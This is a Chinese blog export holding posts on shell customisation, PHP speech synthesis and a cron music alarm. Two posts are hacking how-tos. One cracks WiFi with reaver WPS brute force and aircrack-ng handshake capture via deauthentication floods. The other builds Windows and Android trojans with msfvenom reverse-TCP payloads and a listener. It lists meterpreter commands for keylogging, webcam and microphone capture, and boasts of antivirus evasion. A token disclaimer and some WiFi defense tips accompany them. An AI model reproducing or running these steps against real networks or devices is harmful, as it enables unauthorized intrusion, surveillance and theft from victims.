<p>最后谈谈应用，由于PHP用来写web应用，每个请求完了就销毁了，很多设计模式和数据结构基本上很难用到，除非拿来写一些常驻后台应用。<br>比如说队列，一般都是用redis队列，或者rabbitmq等专业软件实现。但是你如果问可以用PHP来实现一个队列服务常驻后台吗？那是肯定可以的，但是意义不大,<br>PHP的运行效率和C等静态语言那比是差了10万八千里…so,多了解了解一些也是不错的，虽然不一定用得上</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali系统下WiFi密码破解</title>
    <url>/2015/linux/kali-wifi-password.html</url>
    <content><![CDATA[<p>在网络渗透中,能够接入被攻击者的网络至关重要,只要黑客接入你的网络,利用DNS欺骗,arp攻击等各种钓鱼技术,基本上就能获取一切信息,WIFI网络的安全性重要性不言而喻!</p>
<p>手机上有很多类似360免费WIFI和WIFI万能钥匙的软件,可以”破解”WIFI密码,实际上这类软件不是”破解”而是”偷”密码,这类软件在安装的时候会自动上传你家的WIFI密码,也有可能是你一不小心分享出去的!分享之后别人使用软件就能连上你家的WIFI了,一般来说,商家WIFI比较多。</p>
<a id="more"></a>

<h2 id="常见的WIFI破解技术有2种"><a href="#常见的WIFI破解技术有2种" class="headerlink" title="常见的WIFI破解技术有2种:"></a>常见的WIFI破解技术有2种:</h2><p>攻击测试环境:kali linux 64位,可以安装双系统,如果用虚拟机的话必须要用外置USB网卡!</p>
<h3 id="1-PIN"><a href="#1-PIN" class="headerlink" title="1.PIN"></a>1.PIN</h3><p>该技术主要利用路由器的wps功能的bug,PIN 码分前4 和后4，先破前4 只有最多一万个组合，破后4 中的前3 只有一千个组合，一共就是一万一千个密码组合。 10 的4 次方+10 的3 次方=11000 个密码组合。当reaver 确定前4 位PIN 密码后，其任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了。总共一万一千个密码!</p>
<p>主要攻击工具:reaver,该工具十分强大,有很多配置参数,这里只列出最简单的攻击步骤,仅供参考:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.airmon-ng start wlan0 #启动网卡的监听模式</span><br><span class="line">2.airodump-ng wlan0mon  #查看周围区域所有WIFI信号情况</span><br><span class="line">3.reaver -i wlan0mon -b AP_MAC -vv  #开始pin</span><br><span class="line">4.reaver -i wlan0mon -b AP_Mac -p WPS_PIN  #得到pin值获取密码</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实现在很多路由器都关闭了wps功能,所以没法pin,而且很多新的路由器都是防pin!</p>
</blockquote>
<h3 id="2-暴力穷尽破解"><a href="#2-暴力穷尽破解" class="headerlink" title="2.暴力穷尽破解"></a>2.暴力穷尽破解</h3><p>该技术理论上只要计算机计算能力够强大,没有什么密码破解不了!只是时间长短的问题.先抓握手包然后跑包!</p>
<p>主要工具: aircrack-ng</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.airmon-ng check kill        #kill一些无关进程</span><br><span class="line">2.airmon-ng start wlan0       #开启网卡监听模式</span><br><span class="line">3.airodump-ng wlan0mon        #查看周围区域所有WIFI信号情况</span><br><span class="line">4.airodump-ng -c 信道 --bssid 目标mac -w wep wlan0mon   #开始抓包</span><br><span class="line">5.airodump-ng -c 信道 --bssid 目标mac wlan0mon  #查看当前环境的WiFi连接情况</span><br><span class="line">6.aireplay-ng --deauth 10000 -a 目标mac -c 客户端mac wlan0mon   #对连接到目标ap的客户端攻击,使其掉线,抓取握手包!</span><br></pre></td></tr></table></figure>

<p>备注:抓包的关键是第6步抓取握手包,所谓握手包就是对方设备掉线后重新连接WIFI时候的数据包,只要抓到握手包就可以了。</p>
<p>拿到握手包后切换到windows系统,用EWSA等软件跑包,跑包速度看机器配置,主要是看显卡配置,本人笔记本i7+gt750M,一秒钟2万次,其实也看运气,如果是弱密码,分分钟钟的事情,如果是包含字母\标点符号\特殊符号的密码……那几乎不可能!</p>
<h3 id="3-防备措施"><a href="#3-防备措施" class="headerlink" title="3.防备措施:"></a>3.防备措施:</h3><ol>
<li><p>不要安装 xxx免费WIFI等软件,如果不小心把密码分享出去的话,只能改密码了!</p>
</li>
<li><p>关闭路由器wps功能.此功能大部分人都用不到</p>
</li>
<li><p>隐藏ssid.这样别人就搜不到你家的WIFI信号，虽然用途并不大</p>
</li>
<li><p>使用复杂密码,包含字母\标点符号\特殊符号!这招最有效</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统自定义Shell命令</title>
    <url>/2015/linux/linux-custom-shell.html</url>
    <content><![CDATA[<h3 id="一-应用场景"><a href="#一-应用场景" class="headerlink" title="一.应用场景"></a>一.应用场景</h3><p>由于长期使用Ubuntu系统开发和日常生活，每天开机第一件事情就是更新系统，在Ubuntu系统下面更新往往需要好敲好几个命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update		           #更新源</span><br><span class="line">sudo apt-get upgrade		           #更新普通软件包</span><br><span class="line">sudo apt-get dist-upgrade		   #更新系统软件包</span><br><span class="line">sudo apt-get autoremove 		   #卸载无用的软件包</span><br><span class="line">sudo apt-get autoclean			   #清除软件包缓存</span><br></pre></td></tr></table></figure>
<p>通常情况下，我是一条接着一条敲，虽然看着命令行滚动很过瘾，但是时间长，感觉也没意思了，能不能用一条命令代替上面这些命令呢？<br>有人说，可以，你只要把这些命令行存起来，以后复制一下就搞定了…</p>
<a id="more"></a>

<h3 id="二-环境变量"><a href="#二-环境变量" class="headerlink" title="二.环境变量"></a>二.环境变量</h3><p>其实我们是可以自定义命令的，其中关键点就在于环境变量，很多用windows系统的估计也知道环境变量这个东西，当初学Java的时候都知道在系统设置里面有个环境变量设置,<br>在path里面加一个路径，然后在cmd命令行下面敲java就有反应了，其实在Linux系统里面也是一样的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:echo $PATH</span><br><span class="line">jwang@jwang:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin:&#x2F;home&#x2F;jwang&#x2F;Bin</span><br></pre></td></tr></table></figure>
<p>PATH是shell的全局变量，类似框架里面初始化的时候加载的一个超全局变量，里面存的就是当前用户的环境变量信息，一般情况下就是各种bin执行文件的路径。</p>
<p>比如最常见的/usr/bin是普通用户，/sbin是root用户特有，还有一些软件安装时候自动加进去的，比如那个/usr/games。</p>
<p>这个PATH路径的意义就是只要在是上面路径文件夹里面的可执行文件，就可以直接在shell里面执行，比如说 ifconfig，你们说ifconfig的可执行文件放在哪里呢？可以用whereis命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:whereis ifconfig</span><br><span class="line">jwang@jwang:ifconfig: &#x2F;sbin&#x2F;ifconfig &#x2F;usr&#x2F;share&#x2F;man&#x2F;man8&#x2F;ifconfig.8.gz</span><br></pre></td></tr></table></figure>
<p>由上可知，ifconfig命令实际上是放在/sbin里面，这意味着你也可以这样用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:&#x2F;sbin&#x2F;ifconfig</span><br></pre></td></tr></table></figure>
<h3 id="三-自定义命令"><a href="#三-自定义命令" class="headerlink" title="三.自定义命令"></a>三.自定义命令</h3><p>说到这里，估计有人就明白了，那是不是只要我把一个脚本放在PATH里面任意一个目录里面，然后我就可以直接敲，不用写全路径了？Yes，就是这样，比如说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ cd Bin&#x2F;</span><br><span class="line">jwang@jwang:~&#x2F;Bin$ pwd</span><br><span class="line">&#x2F;home&#x2F;jwang&#x2F;Bin</span><br><span class="line"></span><br><span class="line">jwang@jwang:~&#x2F;Bin$ ls</span><br><span class="line">update</span><br><span class="line"></span><br><span class="line">jwang@jwang:~&#x2F;Bin$ cat update</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y upgrade</span><br><span class="line">sudo apt-get -y dist-upgrade</span><br><span class="line">sudo apt-get -y autoremove</span><br><span class="line">sudo apt-get -y autoclean</span><br><span class="line">jwang@jwang:~&#x2F;Bin$</span><br></pre></td></tr></table></figure>
<p>我在用户目录下新建一个Bin文件夹，里面放了一个update脚本，脚本里面内容就是系统更新那些命令，我可以这样做：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:sudo ln -s &#x2F;home&#x2F;jwang&#x2F;Bin&#x2F;update &#x2F;usr&#x2F;bin&#x2F;update</span><br></pre></td></tr></table></figure>
<p>上面的命令是建立一个软链接到/usr/bin目录，这样就可以直接敲update命令了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ update</span><br><span class="line">Hit:1 https:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu xenial InRelease</span><br><span class="line">Hit:2 https:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu xenial-updates InRelease</span><br><span class="line">.........</span><br><span class="line">.........</span><br><span class="line">Fetched 102 kB in 2s (42.0 kB&#x2F;s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Calculating upgrade... Done</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Calculating upgrade... Done</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br></pre></td></tr></table></figure>

<p>是不是很方便呢？<br>还有另外一个方式，就是修改环境变量，把/home/jwang/Bin目录添加到环境变量里面，修改用户目录下的.bashrc文件，或者在全局文件/etc/profile添加一下语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&quot;$PATH:&#x2F;home&#x2F;jwang&#x2F;Bin&quot;</span><br></pre></td></tr></table></figure>
<p>然后执行一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
<p>当然，如果你只想临时修改一下环境变量，可以直接在命令行修改PATH的值，但是退出当前命令行就失效了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:PATH&#x3D;$PATH:&#x2F;home&#x2F;jwang&#x2F;Bin</span><br></pre></td></tr></table></figure>
<h3 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h3><p>以前我是一直没弄明白环境变量是什么意思，一直按着教程配置，前几天突然想明白了，环境变量说得通俗易懂点就是说明当前环境有哪些命令可以使用，实际上是在告诉那些程序,<br>如果你找不到这个命令，你可以到这些目录里面找找，都找不到就报错！</p>
<p>日常生活工作中，可以把一些比较长的命令封装一下写个脚本，随便取个名字，只要名字不冲突就行（如果名字一样，<br>在PATH路径里面谁的目录在前面就优先执行谁），还是挺有用的。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-Metasploit制作简易木马</title>
    <url>/2015/linux/kali-metasploit.html</url>
    <content><![CDATA[<p>相信很多人都有这种感觉,觉得那些会做木马病毒的人非常牛逼,当然会自己完全写出来木马病毒的肯定非常牛逼,但是实际上,大部分人都是在前人的基础上修改,很多则是用工具生成,出于兴趣,研究了一段时间”黑”科技,也实践了一下!</p>
<p>总结了几点简单的工具用法,如果你会用这些工具,你会发现也许一个木马没有你像现在那么难做出来!本文是本着研究的精神,所有攻击行为都是测试,请勿用于非法用途!</p>
<p>测试环境:kali linux windows7 windows 10 Android等操作系统</p>
<p>主要工具:metasploit framework</p>
<a id="more"></a>

<p>关于所用工具,本文不做过多介绍,这里介绍的使用方法也是最基本最简单的用法:</p>
<h2 id="1-使用metasploit-工具生存一个木马-windows版本-命令如下"><a href="#1-使用metasploit-工具生存一个木马-windows版本-命令如下" class="headerlink" title="1.使用metasploit 工具生存一个木马(windows版本),命令如下:"></a>1.使用metasploit 工具生存一个木马(windows版本),命令如下:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.47 LPORT&#x3D;8080 -f exe &gt;demo.exe</span><br></pre></td></tr></table></figure>
<p>LHOST=后面的ip地址是你自己的局域网ip,目前本人所有的攻击测试仅在局域网试过,也就是内网,关于外网的使用暂时不太清楚如何进行!</p>
<p>demo.exe为生成的木马文件,把木马文件拷贝到对方电脑上,双击即可运行!据测试,该木马可以过360安全卫士,电脑管家等常用杀毒软件!这还是在没有做任何加密\加壳的情况下…..不过在有些人的电脑上360可以杀出来!可能是版本不同</p>
<h2 id="2-打开软件-设置好监听-命令依次如下"><a href="#2-打开软件-设置好监听-命令依次如下" class="headerlink" title="2.打开软件,设置好监听,命令依次如下:"></a>2.打开软件,设置好监听,命令依次如下:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payloads windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.1.47</span><br><span class="line">set LPORT 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="3-坐等上钩"><a href="#3-坐等上钩" class="headerlink" title="3.坐等上钩"></a>3.坐等上钩</h2><p>此时,只要对方电脑点击运行demo.exe木马文件,这边监听端口就可以收到信息,建立连接!然后可以执行一些入侵指令,对方现在电脑完全在你的掌控之下,常用命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysinfo     &#x2F;&#x2F;查看攻击主机的系统信息</span><br><span class="line">kill         &#x2F;&#x2F;结束进程</span><br><span class="line">ps          &#x2F;&#x2F;查看进程</span><br><span class="line">reboot      &#x2F;&#x2F;重启电脑</span><br><span class="line">reg        &#x2F;&#x2F;修改注册表</span><br><span class="line">shell        &#x2F;&#x2F;获取shell</span><br><span class="line">shutdown    &#x2F;&#x2F;关闭电脑</span><br><span class="line">keyscan_start &#x2F;&#x2F;开启健盘记录功能</span><br><span class="line">keyscan_dump &#x2F;&#x2F;查看健盘记录信息</span><br><span class="line">keyscan_stop &#x2F;&#x2F;停止健盘记录</span><br><span class="line">download     &#x2F;&#x2F;下载文件</span><br><span class="line">upload        &#x2F;&#x2F;上传文件</span><br><span class="line">uictl enable keyboard　　　&#x2F;&#x2F;获取键盘鼠标控制权</span><br><span class="line">record_mic　　　　&#x2F;&#x2F;音频录制</span><br><span class="line">webcam_chat　　　&#x2F;&#x2F;查看摄像头接口</span><br><span class="line">webcam_list　　　&#x2F;&#x2F;查看摄像头列表</span><br><span class="line">webcam_stream　 &#x2F;&#x2F;摄像头视频获取</span><br><span class="line">................</span><br></pre></td></tr></table></figure>
<h2 id="4-生成Android版本的木马-其实步骤和上面差不多"><a href="#4-生成Android版本的木马-其实步骤和上面差不多" class="headerlink" title="4.生成Android版本的木马,其实步骤和上面差不多"></a>4.生成Android版本的木马,其实步骤和上面差不多</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.47 LPORT&#x3D;8080 -r &gt;demo.apk</span><br></pre></td></tr></table></figure>
<p>只要你下载安装到你手机上,你手机基本上也是别人的了,获取联系人\通讯录\定位打开摄像头\照片…….而且经测试,小米手机自带的安全中心对此木马完全没用!</p>
<p>不过,据我暂时了解的知识,距离一个完整的木马还有点距离:</p>
<ol>
<li><p>杀毒软件.据我测试,腾讯的电脑管家就是垃圾,扫描不出来我生成的木马,360基本上一扫就出来,经过简单编码加密后,360会提示风险程序,而系统自带的windows defender更是一点点用都没.不过要想真把木马做成免杀还得花点功夫…….</p>
</li>
<li><p>木马持续后门.所谓持续后门就是能让木马开机后自启,经测试,msf自带的2种方法无效…..暂时未找到可行性方法!</p>
</li>
<li><p>外网控制.这是一个大问题,比较难解决,现在的攻击都是基于同一个局域网内!</p>
</li>
<li><p>权限问题.360是个麻烦事,在有些机子上进行操作,比如打开摄像头,360会有提示…..而且木马暂时还没法子终结360的进程,所以蛋疼!</p>
</li>
</ol>
<p>在日常生活中,专门去攻击某些个人的情况很少,很多时候黑客都是采用自动化工具遍地撒网,利用一些公开的漏洞进行攻击!普通人能做的只是让自己别中这些自动化黑客工具的招就行了,如果某些个人或者组织想黑你,真的很简单………….</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP实现语音播报</title>
    <url>/2015/coding/php/php-radio.html</url>
    <content><![CDATA[<p>大家估计都知道现在很多AI音响能够给你播报天气，叫你起床…甚至能够接受语音指令！所谓的人工智能音响，听起来很高大上，都说PHP是最好的编程语言，今天我就带大家来实现一个语音播报功能，写个美女叫你早上起床！<br>先大体说一个思路，PHP怎么实现语音播报呢？其实就是调个API（接口）的事情，这个就尴尬了。实际上，现在很多AI平台都提供一些成熟的接口供你使用，比如语音转文字，文字转语音，语音唤醒等等，<br>这里我使用的是百度的语音合成<a href="https://ai.baidu.com/tech/speech/tts" target="_blank" rel="noopener">接口,点击查看</a>, 思路就是使用PHP获取当前的时间和天气状况，然后调用接口转换成甜美的妹子语音播放出来。。。你没看错，就是这么简单！</p>
<p>第一步：获取时间信息</p>
<p>举个例子，文字内容可能是这样：“主人，早上好，今天是2017年12月18号上午8点整，星期一”，这样的内容用PHP自带的几个时间函数就能搞定，然后拼接成字符文字！下面是一些简单实例代码：</p>
<img src="/images/old/3571187-e38927d3c3b1ea69.jpeg" />

<a id="more"></a>

<p>第二布：获取天气状况</p>
<p>举个例子，文字内容可能是这样：“今天天气多云转晴，温度5-15度，湿度80%，空气污染指数69”。要想找到一个靠谱而又免费的api还有点麻烦，很多免费的api提供的天气信息都比较简单，只有天气状况和温度，没有未来天气状况，最后我就找了个凑合用，谁有更好的api留个爪。实例代码如下：</p>
<img src="/images/old/3571187-8637f3d6eb686b32.jpeg" />


<p>第三步：语音合成</p>
<p>这个是调用的百度的接口，首先呢，你得去百度那注册一个账号，获取开发者的key和secret，会有一些免费的调用次数，不拿去商用的话完全够了！然后下载百度提供的SDK，用法非常简单，实例代码如下：</p>
<img src="/images/old/3571187-a4321ce7289a4ac4.jpeg" />

<p>大家可以看到最后的返回的内容被我存到/tmp/audio.mp3这个文件里面去了(这里使用的是Ubuntu系统)，这里可能会有一个写入权限问题，建议大家最后执行脚本的时候加上sudo。</p>
<p>第四步：播放合成之后的语音文件</p>
<p>我们不可能去用音乐播放器手动播放，其实Linux在命令行下也可以播放音乐，需要安装一个软件，直接给大家Ubuntu下的安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sox libsox-fmt-all</span><br></pre></td></tr></table></figure>

<p>安装完成之后就可以使用play命令播放音乐，举个例子：play hello.mp3</p>
<p>所以接下来我们就可以使用PHP去执行播放命令，实例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec(&#39;sudo &#x2F;usr&#x2F;bin&#x2F;play &#x2F;tmp&#x2F;audio.mp3&#39;);</span><br></pre></td></tr></table></figure>
<p>最后，在Linux里面运行脚本，让脚本常驻后台，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;demo&#x2F;BaiduSound&#x2F;index.php &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>以上就是全部步骤，剩下的大家发挥想象力，比如定时给你播报一些股票信息、播放歌曲、早上定时叫你起床。从理论上说我们还可以调用百度API接口去识别我们的语音命令，<br>然后根据命令去执行操作，这样岂不是就是一个AI音响了？哈哈，纯属娱乐，这个方案有一个问题就是你得保证你的电脑一直是开机状态，有点浪费电，有兴趣的童鞋可以买个类似树莓派这样的低功耗设备去运行。<br>有一个小坑，就是假如你电脑正在播放视频或者音乐，这时候可能无法播报，好像是音频冲突，具体原因未知，找了好久没找到解决方案～</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu命令行下打造一个音乐闹钟</title>
    <url>/2015/linux/ubuntu-music.html</url>
    <content><![CDATA[<h3 id="一-命令行播放音乐"><a href="#一-命令行播放音乐" class="headerlink" title="一.命令行播放音乐"></a>一.命令行播放音乐</h3><p>第一次听说Linux命令行能播放歌曲我是怀疑的…一直觉得命令行干这个事情应该非常复杂，其实想想图形界面本质上只是一种交互方式，可能大家平时用的音乐播放器都有一个非常漂亮的界面,点一下就能播放音乐，但是其本质上还是调用系统API操控音响或者耳机等设备来发出声音！</p>
<p>言归正传，在Linux命令行下播放音乐只需要一行命令搞定：</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ sudo apt-get install sox libsox-fmt-all</span><br></pre></td></tr></table></figure>
<p>然后播放歌曲只需要在其目录下面play就行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~&#x2F;Music&#x2F;CloudMusic$ play *.mp3</span><br><span class="line">jwang@jwang:~&#x2F;Music&#x2F;CloudMusic$ play 平凡之路.mp3</span><br></pre></td></tr></table></figure>
<p>*.mp3是播放所有mp3歌曲，也可以指定歌曲名，Ctrl+c可以切换歌曲，即中断当前播放歌曲，切换到下一曲，这个命令是很强大，有很多可选参数，大家可以man一下</p>
<h3 id="二-随机播放歌曲"><a href="#二-随机播放歌曲" class="headerlink" title="二.随机播放歌曲"></a>二.随机播放歌曲</h3><p>默认情况下，播放是按照你文件中歌曲的排序顺序播放的，如何实现随机播放呢？我想了一个小技巧，写了一个shell脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#歌曲存放路径</span><br><span class="line">dir&#x3D;&#39;&#x2F;home&#x2F;jwang&#x2F;Music&#x2F;CloudMusic&#39;</span><br><span class="line"></span><br><span class="line">#歌曲名称列表,中间不要有空格</span><br><span class="line">sounds&#x3D;(</span><br><span class="line">CanoninD.mp3</span><br><span class="line">泡沫.mp3</span><br><span class="line">演员.mp3</span><br><span class="line">南山南.mp3</span><br><span class="line">Beautiful.mp3</span><br><span class="line">Victory.mp3</span><br><span class="line">DreamItPossible.mp3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#产生随机数</span><br><span class="line">function rand()&#123;</span><br><span class="line">    min&#x3D;$1</span><br><span class="line">    max&#x3D;$(($2-$min+1))</span><br><span class="line">    num&#x3D;$(date +%s%N)</span><br><span class="line">    return $(($num%$max+$min))</span><br><span class="line">&#125;</span><br><span class="line">rand 0 $&#123;#sounds[@]&#125;-1</span><br><span class="line">#执行播放命令</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;play $&#123;dir&#125;&#x2F;$&#123;sounds[$?]&#125;</span><br></pre></td></tr></table></figure>
<p>当然这也是伪随机，而且需要把歌曲名称存在数组里面，好处就在可以自定义需要播放的歌曲，坏处就说如果需要播放的歌曲很多，那就麻烦了，可以给这个脚本起一个名字比如说music，以后直接敲music就可以随机播放一首歌曲，也可以把这个命令放到环境变量里面去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ sudo ln -s &#x2F;home&#x2F;jwang&#x2F;Documents&#x2F;play.sh &#x2F;usr&#x2F;bin&#x2F;music</span><br><span class="line">jwang@jwang:~$ music</span><br></pre></td></tr></table></figure>
<h3 id="三-定时音乐闹钟"><a href="#三-定时音乐闹钟" class="headerlink" title="三.定时音乐闹钟"></a>三.定时音乐闹钟</h3><p>Linux下定时任务很容易配置，这里不多说，给一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ crontab -e</span><br></pre></td></tr></table></figure>
<p>加入下面语句，意思是每天早上7点50随机播放一首歌曲，当然前提是你电脑要开机…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 7 * * * nohup &#x2F;usr&#x2F;bin&#x2F;music &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>其实我觉得可以加一条定时任务，每隔1个小时播放一首歌曲缓解一下工作压力</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* *&#x2F;1 * * * nohup &#x2F;usr&#x2F;bin&#x2F;music &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>好了，就说这么多了，虽然闹钟手机也能设置，但是折腾电脑玩的就是自己动手的乐趣!祝大家玩机愉快！</p>
<p>有一点坑的地方需要说明，就是Ubuntu下使用这个play命令播放音乐可能会产生冲突，意思就是如果你正在播放视频或者音乐，这时候的定时任务里面play命令可能无法播放成功，具体原因暂时还没找到</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
</search>
